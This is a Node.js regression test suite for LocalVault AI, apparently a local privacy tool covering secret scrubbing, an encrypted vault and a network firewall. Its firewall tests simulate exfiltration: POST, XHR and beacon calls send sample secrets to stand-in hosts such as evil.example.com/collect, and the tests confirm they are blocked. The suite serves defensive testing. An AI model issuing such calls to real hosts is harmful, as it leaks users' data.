
/**
 * LocalVault AI v2.0 — Regression Verification Suite
 *
 * Tests:
 * 1. Repository integrity
 * 2. Luhn validation
 * 3. Shannon entropy
 * 4. PII and secret scrubbing
 * 5. Fuzzy placeholder rehydration
 * 6. AES-256-GCM encrypted vault
 * 7. Network firewall policy
 * 8. Runtime fetch, XHR and beacon interceptors
 * 9. WAV encoding and audio resampling
 * 10. Note structuring
 * 11. CLI commands
 * 12. Async entity detection
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  PIIEngine,
  calculateShannonEntropy,
  isValidLuhn,
  isAllowlistedLoopback,
  rehydrateText
} from '../src/pii-engine.js';

import {
  CryptoVault,
  encryptVault,
  decryptVault,
  serializeVaultFile
} from '../src/crypto-vault.js';

import { NetworkFirewall } from '../src/network-firewall.js';

import {
  structureTranscript,
  SUPPORTED_NOTE_MODES
} from '../src/note-structurer.js';

import {
  synthesizeTestWav,
  encodeWavBytes,
  exportWavBlob,
  resampleTo16kHzMono,
  WHISPER_SAMPLE_RATE
} from '../src/audio-utils.js';

import { runCli } from '../bin/localvault-cli.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '..');

const REQUIRED_FILES = [
  '.github/workflows/deploy.yml',
  'package.json',
  'vite.config.js',
  'public/coi-serviceworker.js',
  'index.html',
  'src/styles.css',
  'src/main.js',
  'src/worker.js',
  'src/pii-engine.js',
  'src/crypto-vault.js',
  'src/network-firewall.js',
  'src/note-structurer.js',
  'src/audio-utils.js',
  'bin/localvault-cli.mjs',
  'tests/verify.mjs',
  'README.md'
];

let passed = 0;
let failed = 0;

async function runTest(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  [PASS] ${name}`);
  } catch (error) {
    failed++;
    console.error(`  [FAIL] ${name}: ${error.message}`);
    console.error(error.stack);
  }
}

/**
 * Capture CLI output so regression tests remain readable.
 */
function captureConsole(callback) {
  const originalLog = console.log;
  const originalError = console.error;

  const captured = {
    stdout: [],
    stderr: []
  };

  console.log = (...args) => {
    captured.stdout.push(args.join(' '));
  };

  console.error = (...args) => {
    captured.stderr.push(args.join(' '));
  };

  try {
    return {
      result: callback(),
      captured
    };
  } finally {
    console.log = originalLog;
    console.error = originalError;
  }
}

console.log('==============================================================');
console.log(' LocalVault AI — Regression Verification');
console.log('==============================================================');

// --------------------------------------------------------------
// 1. Repository integrity
// --------------------------------------------------------------

await runTest(
  '1. Repository Integrity — All 16 Required Files',
  () => {
    for (const relativePath of REQUIRED_FILES) {
      const fullPath = path.join(ROOT_DIR, relativePath);

      assert.ok(
        fs.existsSync(fullPath),
        `Missing required file: ${relativePath}`
      );

      const stat = fs.statSync(fullPath);

      assert.ok(
        stat.isFile() && stat.size > 0,
        `Required file is empty or invalid: ${relativePath}`
      );
    }
  }
);

// --------------------------------------------------------------
// 2. Luhn validation
// --------------------------------------------------------------

await runTest(
  '2. ISO/IEC 7812 Luhn Check-Digit Validation',
  () => {
    assert.equal(
      isValidLuhn('4532-0151-1283-0366'),
      true
    );

    assert.equal(
      isValidLuhn('4532-0151-1283-0367'),
      false
    );

    assert.equal(
      isValidLuhn('0000000000000000'),
      false
    );

    // The function validates payment-card lengths (13–19 digits).
    assert.equal(
      isValidLuhn('49927398716'),
      false
    );

    assert.equal(
      isValidLuhn('not-a-card-number'),
      false
    );

    assert.equal(
      isValidLuhn(null),
      false
    );
  }
);

// --------------------------------------------------------------
// 3. Shannon entropy and loopback validation
// --------------------------------------------------------------

await runTest(
  '3. Shannon Entropy and Loopback Address Validation',
  () => {
    assert.equal(calculateShannonEntropy(''), 0);
    assert.equal(calculateShannonEntropy('aaaaaaaaaa'), 0);
    assert.equal(calculateShannonEntropy('ab'), 1);

    const highEntropyKey =
      '9a8B7c6D5e4F3g2H1i0J9k8L7m6N5o4P';

    assert.ok(
      calculateShannonEntropy(highEntropyKey) > 4.2
    );

    assert.ok(
      calculateShannonEntropy('development') < 3.5
    );

    assert.equal(
      isAllowlistedLoopback('127.0.0.1'),
      true
    );

    assert.equal(
      isAllowlistedLoopback('127.0.0.2'),
      true
    );

    assert.equal(
      isAllowlistedLoopback('localhost'),
      true
    );

    assert.equal(
      isAllowlistedLoopback('::1'),
      true
    );

    assert.equal(
      isAllowlistedLoopback('::ffff:127.0.0.1'),
      true
    );

    assert.equal(
      isAllowlistedLoopback('127.not.valid'),
      false
    );

    assert.equal(
      isAllowlistedLoopback('192.168.1.1'),
      false
    );
  }
);

// --------------------------------------------------------------
// 4. PII and secret scrubbing
// --------------------------------------------------------------

await runTest(
  '4. PII and Secret Scrubbing + Email Allowlist Checks',
  () => {
    const engine = new PIIEngine({
      customBlocklist: ['ProjectOmega']
    });

    const sample = [
      '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU=\n-----END OPENSSH PRIVATE KEY-----',
      'DB=postgres://dbuser:MyS3cr3tP@ss99@198.51.100.25:5432/main',
      'OPENAI=sk-proj-1234567890abcdefghijklmnopQRSTUV',
      'ANTHROPIC=sk-ant-api03-1234567890abcdefghijklmnopQRSTUV',
      'GITHUB=ghp_1234567890abcdefghijklmnopQRSTUV1234',
      'AWS=AKIAIOSFODNN7EXAMPLE',
      'STRIPE=sk_live_51H8abcDEF1234567890xyz',
      'PASSWORD="UltraSecretPasswordValue99!"',
      'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
      'Card: 4532-0151-1283-0366, SSN: 123-45-6789, Email: dev@company.io, Phone: (415) 555-2671',
      'Loopback: 127.0.0.1, localhost, and 0.0.0.0 must remain untouched.',
      'Codename: ProjectOmega launched by Engineer Alice Smith.',
      'Sample address: test@example.com'
    ].join('\n');

    const result = engine.scrub(sample);
    const clean = result.scrubbedText;

    const secrets = [
      'BEGIN OPENSSH PRIVATE KEY',
      'MyS3cr3tP@ss99',
      'sk-proj-1234567890',
      'sk-ant-api03-',
      'ghp_1234567890',
      'AKIAIOSFODNN7EXAMPLE',
      'sk_live_51H8',
      'UltraSecretPasswordValue99!',
      '4532-0151-1283-0366',
      '123-45-6789',
      'dev@company.io',
      'ProjectOmega',
      'Alice Smith',
      'test@example.com'
    ];

    for (const secret of secrets) {
      assert.ok(
        !clean.includes(secret),
        `Secret was not scrubbed: ${secret}`
      );
    }

    assert.ok(clean.includes('127.0.0.1'));
    assert.ok(clean.includes('localhost'));
    assert.ok(clean.includes('0.0.0.0'));

    assert.ok(result.stats.totalRedacted > 0);
    assert.ok(Object.keys(result.vaultMap).length > 0);

    const allowlistedEngine = new PIIEngine({
      customAllowlist: ['safe@example.com']
    });

    const allowlistResult = allowlistedEngine.scrub(
      'safe@example.com and test@example.com'
    );

    assert.ok(
      allowlistResult.scrubbedText.includes('safe@example.com')
    );

    assert.ok(
      !allowlistResult.scrubbedText.includes('test@example.com')
    );
  }
);

// --------------------------------------------------------------
// 5. Fuzzy placeholder rehydration
// --------------------------------------------------------------

await runTest(
  '5. Fuzzy Placeholder Rehydration',
  () => {
    const vaultMap = {
      '[EMAIL_1]': 'founder@localvault.dev',
      '[OPENAI_KEY_1]': 'sk-proj-secret1234567890abcdef',
      '[DB_URI_1]': 'postgres://user:pass@10.0.0.8:5432/db'
    };

    const mutatedOutput =
      'Contact [email_1] or {{EMAIL_1}} using key {{openai-key-1}} and connect to <db_uri 1> or (EMAIL-1).';

    const restored = rehydrateText(
      mutatedOutput,
      vaultMap
    );

    assert.equal(
      restored,
      'Contact founder@localvault.dev or founder@localvault.dev using key sk-proj-secret1234567890abcdef and connect to postgres://user:pass@10.0.0.8:5432/db or founder@localvault.dev.'
    );

    assert.equal(
      rehydrateText('No placeholders here.', {}),
      'No placeholders here.'
    );
  }
);

// --------------------------------------------------------------
// 6. Cryptographic vault
// --------------------------------------------------------------

await runTest(
  '6. AES-256-GCM + PBKDF2-SHA256 Vault Validation',
  async () => {
    const vault = new CryptoVault();

    const secretData = {
      '[EMAIL_1]': 'founder@localvault.ai',
      '[AWS_KEY_1]': 'AKIAIOSFODNN7EXAMPLE'
    };

    const passphrase =
      'CorrectHorseBatteryStaple!99';

    const envelope = await vault.lock(
      secretData,
      passphrase
    );

    assert.equal(envelope.magic, 'LVVAULT_V2');
    assert.equal(envelope.version, '2.1.0');
    assert.equal(envelope.kdf, 'PBKDF2-SHA256');
    assert.equal(envelope.cipher, 'AES-256-GCM');
    assert.equal(envelope.iterations, 310000);

    assert.equal(vault.locked, true);

    assert.equal(
      typeof envelope.salt,
      'string'
    );

    assert.equal(
      typeof envelope.iv,
      'string'
    );

    assert.equal(
      typeof envelope.ciphertext,
      'string'
    );

    const decrypted = await vault.unlock(
      envelope,
      passphrase
    );

    assert.deepEqual(decrypted, secretData);
    assert.equal(vault.locked, false);

    const serialized = serializeVaultFile(envelope);

    assert.deepEqual(
      JSON.parse(serialized),
      envelope
    );

    // Wrong passphrase must fail authentication.
    await assert.rejects(
      () => decryptVault(envelope, 'WrongPassphrase'),
      /Vault authentication failed/
    );

    // New vaults must reject weak passphrases.
    await assert.rejects(
      () => encryptVault(secretData, 'short'),
      /at least 12 characters/
    );

    // Tampered ciphertext must fail authentication.
    const tamperedEnvelope = { ...envelope };

    const ciphertextBytes = Buffer.from(
      envelope.ciphertext,
      'base64'
    );

    ciphertextBytes[0] ^= 1;

    tamperedEnvelope.ciphertext =
      ciphertextBytes.toString('base64');

    await assert.rejects(
      () => decryptVault(tamperedEnvelope, passphrase),
      /Vault authentication failed/
    );

    // Invalid version must be rejected.
    await assert.rejects(
      () => decryptVault(
        { ...envelope, version: '9.0.0' },
        passphrase
      ),
      /Unsupported vault version/
    );

    // Invalid Base64 must be rejected.
    await assert.rejects(
      () => decryptVault(
        { ...envelope, salt: 'not-valid-base64!' },
        passphrase
      ),
      /invalid salt/i
    );

    // Excessive work factors must be rejected.
    await assert.rejects(
      () => decryptVault(
        { ...envelope, iterations: 999999999 },
        passphrase
      ),
      /iteration count/i
    );

    // Missing passphrases must be rejected.
    await assert.rejects(
      () => decryptVault(envelope, ''),
      /passphrase/i
    );

    // Clearing the in-memory vault must remove unlocked data.
    vault.clear();

    assert.equal(vault.locked, true);
    assert.equal(vault.unlockedData, null);
    assert.equal(vault.activeEnvelope, null);
  }
);

// --------------------------------------------------------------
// 7. Network firewall policy
// --------------------------------------------------------------

await runTest(
  '7. Network Firewall Host, Protocol and Payload Policies',
  () => {
    const firewall = new NetworkFirewall();

    const approvedModel = firewall.inspectRequest(
      'https://huggingface.co/onnx-community/whisper-tiny.en/resolve/main/model.onnx',
      'GET'
    );

    assert.equal(approvedModel.allowed, true);
    assert.equal(approvedModel.action, 'ALLOWED_READONLY');

    const approvedCdn = firewall.inspectRequest(
      'https://cdn.jsdelivr.net/npm/example/package.js',
      'GET'
    );

    assert.equal(approvedCdn.allowed, true);

    const unapprovedGet = firewall.inspectRequest(
      'https://evil.example.com/collect',
      'GET'
    );

    assert.equal(unapprovedGet.allowed, false);
    assert.equal(
      unapprovedGet.action,
      'BLOCKED_UNAPPROVED_HOST'
    );

    const spoofedHost = firewall.inspectRequest(
      'https://huggingface.co.evil.example/model.onnx',
      'GET'
    );

    assert.equal(spoofedHost.allowed, false);

    const insecureProtocol = firewall.inspectRequest(
      'http://evil.example.com/model.onnx',
      'GET'
    );

    assert.equal(insecureProtocol.allowed, false);
    assert.equal(
      insecureProtocol.action,
      'BLOCKED_PROTOCOL'
    );

    const credentialUrl = firewall.inspectRequest(
      'https://user:password@huggingface.co/model.onnx',
      'GET'
    );

    assert.equal(credentialUrl.allowed, false);
    assert.equal(
      credentialUrl.action,
      'BLOCKED_CREDENTIAL_URL'
    );

    const getWithBody = firewall.inspectRequest(
      'https://huggingface.co/model.onnx',
      'GET',
      '{"secret":"test"}'
    );

    assert.equal(getWithBody.allowed, false);
    assert.equal(
      getWithBody.action,
      'BLOCKED_PAYLOAD'
    );

    const post = firewall.inspectRequest(
      'https://evil.example.com/collect',
      'POST',
      '{"secret":"test"}'
    );

    assert.equal(post.allowed, false);
    assert.equal(post.action, 'BLOCKED_METHOD');

    const patch = firewall.inspectRequest(
      'https://huggingface.co/model',
      'PATCH',
      '{"value":1}'
    );

    assert.equal(patch.allowed, false);

    const nonStandardPort = firewall.inspectRequest(
      'https://huggingface.co:8443/model',
      'GET'
    );

    assert.equal(nonStandardPort.allowed, false);
    assert.equal(nonStandardPort.action, 'BLOCKED_PORT');

    const localAsset = firewall.inspectRequest(
      './assets/index.js',
      'GET'
    );

    assert.equal(localAsset.allowed, true);
    assert.equal(
      localAsset.action,
      'ALLOWED_SAME_ORIGIN'
    );

    const localData = firewall.inspectRequest(
      'data:text/plain,LocalVault',
      'GET'
    );

    assert.equal(localData.allowed, true);
    assert.equal(localData.action, 'ALLOWED_LOCAL');

    // Sensitive values must not be written into audit URLs.
    const sensitiveUrl = firewall.inspectRequest(
      'https://huggingface.co/model?token=secret-value&email=private@example.com',
      'GET'
    );

    assert.equal(sensitiveUrl.allowed, true);
    assert.ok(!sensitiveUrl.url.includes('secret-value'));
    assert.ok(!sensitiveUrl.url.includes('private@example.com'));

    // Strict lockdown blocks external requests.
    firewall.setAirGapLockdown(true);

    const blockedExternal = firewall.inspectRequest(
      'https://huggingface.co/model.onnx',
      'GET'
    );

    assert.equal(blockedExternal.allowed, false);
    assert.equal(
      blockedExternal.action,
      'BLOCKED_AIRGAP'
    );

    // Same-origin resources remain available in lockdown.
    const allowedLocal = firewall.inspectRequest(
      './assets/index.js',
      'GET'
    );

    assert.equal(allowedLocal.allowed, true);

    const stats = firewall.getStats();

    assert.ok(stats.totalEvents >= 10);
    assert.ok(stats.blocked >= 5);
    assert.equal(stats.airGapLockdown, true);
    assert.ok(stats.allowedHosts.includes('huggingface.co'));
  }
);

// --------------------------------------------------------------
// 8. Runtime fetch, XHR and beacon interceptors
// --------------------------------------------------------------

await runTest(
  '8. Runtime Request Interceptors and Restoration',
  async () => {
    let originalFetchCalls = 0;

    const originalFetch = async input => {
      originalFetchCalls++;

      return {
        ok: true,
        requested: String(input)
      };
    };

    let originalBeaconCalls = 0;

    const originalSendBeacon = () => {
      originalBeaconCalls++;
      return true;
    };

    class MockXMLHttpRequest {
      open(method, url) {
        this.method = method;
        this.url = url;
      }

      send(body) {
        this.body = body;
      }
    }

    const originalXhrOpen = MockXMLHttpRequest.prototype.open;
    const originalXhrSend = MockXMLHttpRequest.prototype.send;

    const mockGlobal = {
      location: {
        href: 'https://app.localvault.test/'
      },
      fetch: originalFetch,
      XMLHttpRequest: MockXMLHttpRequest,
      navigator: {
        sendBeacon: originalSendBeacon
      }
    };

    const firewall = new NetworkFirewall();
    firewall.install(mockGlobal);

    assert.equal(firewall.installed, true);

    // Same-origin fetch reaches the original method.
    const localResponse = await mockGlobal.fetch('/health');

    assert.equal(localResponse.ok, true);
    assert.equal(originalFetchCalls, 1);

    // Approved external fetch reaches the original method.
    await mockGlobal.fetch(
      'https://huggingface.co/model.onnx'
    );

    assert.equal(originalFetchCalls, 2);

    // Unapproved external fetch is blocked.
    await assert.rejects(
      () => mockGlobal.fetch('https://evil.example.com/data'),
      /LocalVault Firewall/
    );

    assert.equal(originalFetchCalls, 2);

    // Mutating request must not reach original fetch.
    await assert.rejects(
      () => mockGlobal.fetch(
        'https://huggingface.co/model',
        {
          method: 'POST',
          body: '{"data":"test"}'
        }
      ),
      /LocalVault Firewall/
    );

    assert.equal(originalFetchCalls, 2);

    // XHR blocks POST requests.
    const xhr = new mockGlobal.XMLHttpRequest();

    xhr.open('POST', 'https://evil.example.com/collect');

    assert.throws(
      () => xhr.send('sensitive-data'),
      /LocalVault Firewall/
    );

    // Beacon requests are refused without calling the original.
    assert.equal(
      mockGlobal.navigator.sendBeacon(
        'https://evil.example.com/beacon',
        'payload'
      ),
      false
    );

    assert.equal(originalBeaconCalls, 0);

    firewall.uninstall(mockGlobal);

    assert.equal(firewall.installed, false);
    assert.equal(mockGlobal.fetch, originalFetch);

    assert.equal(
      mockGlobal.XMLHttpRequest.prototype.open,
      originalXhrOpen
    );

    assert.equal(
      mockGlobal.XMLHttpRequest.prototype.send,
      originalXhrSend
    );

    assert.equal(
      mockGlobal.navigator.sendBeacon,
      originalSendBeacon
    );
  }
);

// --------------------------------------------------------------
// 9. WAV encoding and resampling
// --------------------------------------------------------------

await runTest(
  '9. WAV Synthesis, Encoding, Export and Resampling',
  async () => {
    const {
      samples,
      wavBytes,
      sampleRate
    } = synthesizeTestWav({
      durationSeconds: 0.5,
      sampleRate: WHISPER_SAMPLE_RATE
    });

    assert.equal(sampleRate, 16000);
    assert.equal(samples.length, 8000);
    assert.equal(wavBytes.byteLength, 44 + 8000 * 2);

    const header = Buffer.from(
      wavBytes.slice(0, 44)
    );

    assert.equal(header.toString('ascii', 0, 4), 'RIFF');
    assert.equal(header.toString('ascii', 8, 12), 'WAVE');
    assert.equal(header.toString('ascii', 12, 16), 'fmt ');
    assert.equal(header.readUInt16LE(20), 1);
    assert.equal(header.readUInt16LE(22), 1);
    assert.equal(header.readUInt32LE(24), 16000);
    assert.equal(header.readUInt16LE(34), 16);
    assert.equal(header.toString('ascii', 36, 40), 'data');

    const encoded = encodeWavBytes(
      new Float32Array([0, 0.5, -0.5]),
      16000
    );

    assert.equal(encoded.length, 50);

    assert.throws(
      () => encodeWavBytes([0, 0.5], 16000),
      /Float32Array/
    );

    assert.throws(
      () => encodeWavBytes(new Float32Array([0]), 0),
      /Sample rate/
    );

    assert.throws(
      () => synthesizeTestWav({ durationSeconds: 0 }),
      /duration/
    );

    assert.throws(
      () => synthesizeTestWav({ frequencyHz: 9000 }),
      /Nyquist/
    );

    const blob = exportWavBlob(
      new Float32Array([0, 0.5, -0.5]),
      16000
    );

    assert.equal(blob.type, 'audio/wav');
    assert.equal(blob.size, 50);

    const resampled = await resampleTo16kHzMono(
      new Float32Array(48000),
      48000,
      16000
    );

    assert.equal(resampled.length, 16000);
    assert.ok(resampled instanceof Float32Array);

    const unchanged = await resampleTo16kHzMono(
      new Float32Array([0, 0.25, -0.25]),
      16000,
      16000
    );

    assert.deepEqual(
      Array.from(unchanged),
      [0, 0.25, -0.25]
    );

    assert.throws(
      () => resampleTo16kHzMono(
        new Float32Array(0),
        16000,
        16000
      ),
      /empty/
    );

    await assert.rejects(
      () => resampleTo16kHzMono(
        new Float32Array([0, 1]),
        16000,
        0
      ),
      /Sample rate/
    );
  }
);

// --------------------------------------------------------------
// 10. Transcript structuring
// --------------------------------------------------------------

await runTest(
  '10. Transcript Structurer — Four Modes and Privacy',
  () => {
    const raw =
      'Incident call with engineer dev@company.org on server 198.51.100.99. ' +
      'We decided to migrate to WebGPU local inference. ' +
      'Todo: rotate token sk-proj-1234567890abcdefghijklmnopQRSTUV immediately.';

    for (const mode of SUPPORTED_NOTE_MODES) {
      const output = structureTranscript(raw, {
        mode,
        autoScrub: true
      });

      assert.equal(output.mode, mode);

      assert.ok(
        !output.markdown.includes('dev@company.org'),
        `Mode ${mode} did not scrub the email`
      );

      assert.ok(
        !output.markdown.includes('sk-proj-1234567890'),
        `Mode ${mode} did not scrub the API key`
      );

      assert.ok(
        output.piiStats.totalRedacted >= 3,
        `Mode ${mode} did not report expected detections`
      );

      assert.ok(output.markdown.length > 0);
      assert.ok(output.sections.summary.length > 0);
    }

    const emptyOutput = structureTranscript('', {
      mode: 'meeting'
    });

    assert.equal(emptyOutput.mode, 'meeting');
    assert.ok(
      emptyOutput.markdown.includes('No transcript content provided.')
    );

    const invalidMode = structureTranscript('Decided to proceed.', {
      mode: 'unknown-mode'
    });

    assert.equal(invalidMode.mode, 'meeting');

    const unsanitized = structureTranscript(
      'Contact person@example.org.',
      {
        mode: 'meeting',
        autoScrub: false
      }
    );

    assert.ok(
      unsanitized.markdown.includes('person@example.org')
    );

    assert.equal(
      unsanitized.piiStats.totalRedacted,
      0
    );
  }
);

// --------------------------------------------------------------
// 11. CLI commands
// --------------------------------------------------------------

await runTest(
  '11. CLI Commands — Scrub, Structure, Entropy and Help',
  () => {
    const scrubRun = captureConsole(() =>
      runCli([
        'scrub',
        'Email alice@acme.io and localhost'
      ])
    );

    assert.equal(scrubRun.result.exitCode, 0);

    assert.ok(
      scrubRun.result.result.scrubbedText.includes('[EMAIL_1]')
    );

    assert.ok(
      scrubRun.result.result.scrubbedText.includes('localhost')
    );

    const structureRun = captureConsole(() =>
      runCli([
        'structure',
        'Decided to ship v2. Todo: run tests.',
        '--mode=incident'
      ])
    );

    assert.equal(structureRun.result.exitCode, 0);

    assert.ok(
      structureRun.result.result.markdown.includes(
        'SRE Incident Post-Mortem'
      )
    );

    const entropyRun = captureConsole(() =>
      runCli(['entropy', 'ab'])
    );

    assert.equal(entropyRun.result.exitCode, 0);
    assert.equal(entropyRun.result.entropy, 1);

    const helpRun = captureConsole(() =>
      runCli(['--help'])
    );

    assert.equal(helpRun.result.exitCode, 0);
    assert.ok(helpRun.result.output.includes('Commands:'));

    const invalidMode = captureConsole(() =>
      runCli([
        'structure',
        'Some notes',
        '--mode=invalid'
      ])
    );

    assert.equal(invalidMode.result.exitCode, 1);

    const missingTarget = captureConsole(() =>
      runCli(['scrub'])
    );

    assert.equal(missingTarget.result.exitCode, 1);

    const unknownCommand = captureConsole(() =>
      runCli(['unknown-command'])
    );

    assert.equal(unknownCommand.result.exitCode, 1);
  }
);

// --------------------------------------------------------------
// 12. Async entity detector
// --------------------------------------------------------------

await runTest(
  '12. Optional Async Entity Detection and Fallback',
  async () => {
    const engine = new PIIEngine({
      slmNerDetector: async () => [
        {
          text: 'Alice Smith',
          type: 'PERSON'
        }
      ]
    });

    const result = await engine.scrubAsync(
      'Please contact Alice Smith for the project update.'
    );

    assert.ok(
      !result.scrubbedText.includes('Alice Smith')
    );

    assert.ok(
      result.scrubbedText.includes('[PERSON_')
    );

    assert.equal(result.stats.totalRedacted, 1);
    assert.equal(result.stats.byLayer[4], 1);

    const fallbackEngine = new PIIEngine({
      slmNerDetector: async () => {
        throw new Error('Optional detector unavailable');
      }
    });

    const fallback = await fallbackEngine.scrubAsync(
      'Email fallback@example.org'
    );

    assert.ok(
      !fallback.scrubbedText.includes('fallback@example.org')
    );

    assert.ok(fallback.stats.totalRedacted >= 1);
  }
);

// --------------------------------------------------------------
// Final report
// --------------------------------------------------------------

console.log('--------------------------------------------------------------');
console.log(`Verification Summary: ${passed} passed, ${failed} failed`);
console.log('--------------------------------------------------------------');

if (failed > 0) {
  process.exitCode = 1;
}
